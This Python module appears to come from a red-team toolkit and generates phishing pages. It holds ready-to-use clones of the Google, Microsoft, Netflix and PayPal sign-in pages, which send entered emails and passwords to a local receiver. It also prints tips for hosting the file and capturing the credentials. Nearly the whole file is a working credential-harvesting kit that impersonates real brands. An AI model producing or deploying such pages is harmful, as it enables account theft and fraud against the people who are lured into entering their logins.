"""
Phishing Template Generator
"""

import os

from rich.console import Console

from redai.core.display import display
from redai.database.repository import save_scan


console = Console()


TEMPLATES = {
    "google": """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Sign in - Google Accounts</title>
    <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #f1f1f1; margin: 0; }
        .container { background: white; padding: 50px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 400px; }
        h1 { color: #1a73e8; font-size: 24px; text-align: center; }
        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 15px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background: #1557b0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Google</h1>
        <p>Sign in with your Google Account</p>
        <form action="http://127.0.0.1:5000/login" method="POST">
            <input type="email" name="email" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Next</button>
        </form>
    </div>
</body>
</html>""",
    
    "microsoft": """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Sign in to your Microsoft account</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #f2f2f2; margin: 0; }
        .container { background: white; padding: 50px; max-width: 400px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 30px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: none; border-bottom: 1px solid #666; background: #fafafa; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #0067b8; color: white; border: none; cursor: pointer; font-size: 15px; margin-top: 20px; }
        button:hover { background: #005da6; }
        img { height: 24px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo.svg" alt="Microsoft">
        <h1>Sign in</h1>
        <form action="http://127.0.0.1:5000/login" method="POST">
            <input type="email" name="email" placeholder="Email, phone, or Skype" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
    </div>
</body>
</html>""",
    
    "netflix": """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Netflix</title>
    <style>
        body { font-family: 'Netflix Sans', Arial, sans-serif; background: #000; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: rgba(0,0,0,0.75); padding: 60px 68px; border-radius: 4px; max-width: 400px; }
        h1 { font-size: 32px; margin-bottom: 30px; }
        input { width: 100%; padding: 16px; margin: 8px 0; background: #333; border: none; border-radius: 4px; color: white; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; padding: 16px; background: #e50914; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; margin-top: 20px; font-weight: bold; }
        button:hover { background: #f40612; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Sign In</h1>
        <form action="http://127.0.0.1:5000/login" method="POST">
            <input type="text" name="email" placeholder="Email or phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>""",
    
    "paypal": """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Log in to your PayPal account</title>
    <style>
        body { font-family: 'PayPal Sans', Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #f5f7fa; margin: 0; }
        .container { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 380px; text-align: center; }
        h1 { color: #003087; font-size: 28px; margin-bottom: 30px; }
        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ccc; border-radius: 25px; box-sizing: border-box; font-size: 16px; }
        button { width: 100%; padding: 15px; background: #0070ba; color: white; border: none; border-radius: 25px; cursor: pointer; font-size: 16px; margin-top: 15px; }
        button:hover { background: #005ea6; }
    </style>
</head>
<body>
    <div class="container">
        <h1>PayPal</h1>
        <form action="http://127.0.0.1:5000/login" method="POST">
            <input type="email" name="email" placeholder="Email or mobile number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>"""
}


def phishing_gen(template: str = "google", project: str = "General", auto: bool = False):
    """Generador de plantillas de phishing (Local HTML)."""
    if not auto:
        display.tool_info("phishing")
    display.header(f"Generating Phishing Template: {template.upper()}")
    
    template_lower = template.lower()
    
    if template_lower not in TEMPLATES:
        display.warning(f"Template '{template}' not found. Using generic.")
        html = f"""<!DOCTYPE html>
<html>
<body style="font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
    <div style="background: #f5f5f5; padding: 40px; border-radius: 10px; text-align: center;">
        <h1>{template.capitalize()} Login</h1>
        <form action="http://127.0.0.1:5000/login" method="POST">
            <input type="text" name="user" placeholder="Username" style="padding: 10px; margin: 5px; width: 200px;"><br>
            <input type="password" name="pass" placeholder="Password" style="padding: 10px; margin: 5px; width: 200px;"><br>
            <button type="submit" style="padding: 10px 30px; margin-top: 10px;">Login</button>
        </form>
    </div>
</body>
</html>"""
    else:
        html = TEMPLATES[template_lower]

    filename = f"{template}_login.html"
    
    try:
        with open(filename, "w", encoding="utf-8") as f:
            f.write(html)
        
        display.success(f"Template created: {os.path.abspath(filename)}")
        display.info("Tip: Host this file with: python -m http.server 80")
        display.info("Capture credentials with: python -m flask run (with a simple receiver)")
        
        save_scan(filename, "phishing_template", f"Template generated for {template}", project)
        
    except Exception as e:
        display.error(f"Error creating file: {e}")
